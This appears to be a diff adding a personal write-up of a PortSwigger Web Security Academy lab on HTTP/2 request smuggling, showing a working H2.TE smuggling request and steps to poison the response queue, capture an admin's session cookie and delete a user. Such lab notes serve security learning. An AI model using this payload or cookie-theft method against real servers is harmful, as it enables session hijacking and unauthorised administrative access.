@@ -205,6 +205,58 @@ url: https://0a4000430333e77180d803f6008600d0.web-security-academy.net/post?post
 
 ## 0x08: Response queue poisoning via H2.TE request smuggling
 
+Prompt:
+> This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.
+> 
+> To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.
+> 
+> The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.
+
+step 1 - find the queue poisoning
+
+attack req
+```
+POST / HTTP/2
+Host: 0ad100960382316381bef2d6009f00c3.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 95
+
+0
+
+GET /404 HTTP/1.1
+Host: 0ad100960382316381bef2d6009f00c3.web-security-academy.net
+
+
+
+
+```
+
+not sure if it worked, but browsed to the page and it broke a lot of css :D
+
+css_broken.jpg
+
+
+sending the payload a few times, then a GET to `/404` results in the page loading, showing we've desync'd the queue
+
+
+step 2 - grab the admin user's response from queue
+
+trying to get via burp intruder, set a grep on carlos
+no success; thinking it's because of the low connection reuse limit of 10
+
+trying again with a tip in mind from the article - use 404/nonexistent page for both URLs to help distinguish
+- set to auto-pause if it sees carlos, added grep for carlos in response
+- no luck again - reshifting focus
+
+trying to have it run until it sees _not_ a 404
+- auto pause if it goes off 404
+
+ultimately was in the right vein - just got unlucky with all the timings
+- will see a 302 with a new session cookie - snag it and add it to browser
+
+browse to admin panel then delete carlos
+
 asdf
 
 ## 0x09: H2.CL request smuggling
